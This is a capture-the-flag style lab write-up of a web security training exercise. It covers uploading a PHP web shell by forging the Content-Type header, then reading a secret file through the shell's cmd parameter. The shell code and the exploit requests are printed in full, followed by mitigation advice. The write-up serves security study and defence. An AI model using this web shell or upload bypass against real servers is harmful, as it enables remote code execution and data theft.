> 🌐 **English** | [Português](LAB-02.pt-BR.md)

# LAB: Web shell upload via Content-Type restriction bypass

**Module:** Server-side vulnerabilities //
**Difficulty:** Apprentice //
**Category:** File upload vulnerabilities //
**Status:** Solved //

## Goal

This lab has an image upload feature that tries to prevent potentially dangerous files from being uploaded. However, this protection relies exclusively on the value of the **Content-Type** header, which is controlled by the user.

To solve the lab, it was necessary to upload a PHP web shell, bypass the upload validation by tampering with the request header, and execute commands on the server to read the contents of `/home/carlos/secret`.

The account provided by the exercise itself was used:

```
Username: wiener
Password: peter
```

## Recon

First, a file named `shell.php` was created, containing a simple PHP web shell:

```php
<?php system($_GET['cmd']); ?>
```

When trying to upload this file normally through the upload feature, the application rejected it.

Intercepting the **POST** request with Burp Suite, it was possible to observe that the server used the **Content-Type** header to validate the type of the uploaded file.

Since this header is completely controlled by the client, the hypothesis arose that it would be possible to bypass this validation by changing only its value, allowing a PHP file to be uploaded disguised as an image.

After the upload, the server stored the file in a publicly accessible directory (`/files/avatars/`), allowing it to be executed directly from the browser.

## Approach

- Created a file named `shell.php` containing a basic PHP web shell.
- Tried to upload it normally and the application blocked it.
- Intercepted the **POST** request using Burp Suite.
- Forwarded the request to Repeater.
- Identified that the file was being sent with the header:

```http
Content-Type: application/x-php
```

- Changed this header to:

```http
Content-Type: image/jpeg
```

- Resent the request.
- The server accepted the upload of the PHP file.
- Then accessed the uploaded file through the URL:

```
/files/avatars/shell.php
```

- Since the server interpreted PHP files, the web shell was executed.
- Used the `cmd` parameter to run commands directly on the operating system.
- First ran:

```
?cmd=ls
```

to confirm the web shell was working.

- After confirming remote command execution, ran:

```
?cmd=cat+/home/carlos/secret
```

- The server returned the contents of the file containing the lab's secret.
- The secret was submitted using the button provided by the platform itself, completing the exercise.

## Payload / Technique used

### Web shell uploaded

```php
<?php system($_GET['cmd']); ?>
```

### Original header

```http
Content-Type: application/x-php
```

### Modified header

```http
Content-Type: image/jpeg
```

### Remote execution test

```http
GET /files/avatars/shell.php?cmd=ls HTTP/1.1
```

### Flag extraction

```http
GET /files/avatars/shell.php?cmd=cat+/home/carlos/secret HTTP/1.1
```

## Evidence

![Evidence-01](imgs/Lab-02A.png)

![Evidence-02](imgs/Lab-02B.png)

## Result

The exploitation confirmed that the upload validation relied exclusively on the **Content-Type** header, allowing a PHP file to be uploaded to the server just by changing that value to an allowed type.

Since the upload directory allowed PHP scripts to run, it was possible to achieve **Remote Code Execution (RCE)**, run arbitrary commands on the operating system, and access the contents of `/home/carlos/secret`, enough to complete the lab.

## Technical notes

### Why does the flaw occur?

This lab presents two distinct flaws that, when combined, result in remote code execution.

#### 1. Insecure Content-Type validation

The application only checks the client-supplied `Content-Type` header to decide whether a file can be uploaded.

Since this header can be freely modified by the user, an attacker can upload a PHP file while falsely claiming it is an image (`image/jpeg`), completely bypassing the implemented protection.

#### 2. Execution of uploaded files

After the upload, the server stores the files in a public directory where PHP scripts are interpreted normally.

This allows the uploaded file to be executed directly through its URL, turning the upload into a **Remote Code Execution (RCE)** vulnerability.

### How to mitigate?

- Never trust the client-supplied **Content-Type** header.
- Validate the file extension and its content using *magic bytes*.
- Use an allowlist for accepted file types.
- Store uploads outside the application's public root.
- Configure the server to prevent script execution in upload directories.
- Rename uploaded files using random names.
- Apply authentication and authorization controls for access to uploaded files.

## References

- [PortSwigger Web Security Academy](https://portswigger.net/web-security/file-upload) (link to the topic, not to the specific lab solution)
- OWASP Web Security Testing Guide - File Upload Testing
- CWE-434 - Unrestricted Upload of File with Dangerous Type
